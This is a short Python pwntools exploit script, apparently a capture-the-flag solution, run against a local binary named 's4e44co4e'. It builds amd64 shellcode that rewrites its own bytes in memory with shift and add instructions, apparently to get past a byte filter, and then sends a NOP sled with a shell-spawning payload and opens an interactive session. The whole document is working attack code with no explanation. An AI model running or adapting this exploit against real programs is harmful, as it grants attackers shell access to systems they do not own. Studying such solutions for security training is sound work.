from pwn import *
context.arch = "amd64"
r = process(["./s4e44co4e"])
input(":")
payload = asm("""
pop rax
pop rax
pop rax
shr byte ptr [rax+0x10],4
add byte ptr [rax+0x10],0x30
push rax
nop
nop
""")

payload += asm("""
shr byte ptr [rax+0x10],4
shr byte ptr [rax+0x28],4
add byte ptr [rax+0x28],92
shr byte ptr [rax+0x2c],4
add byte ptr [rax+0x2c],88
shr byte ptr [rax+0x30],4
nop
nop
""")
payload += "\x20\x90\x90\x90\x20\x90XX\xf0\x50"
r.send(payload.ljust(0x444,'\x04'))
r.send("\x90"*0x44+asm(shellcraft.sh()))
r.interactive()
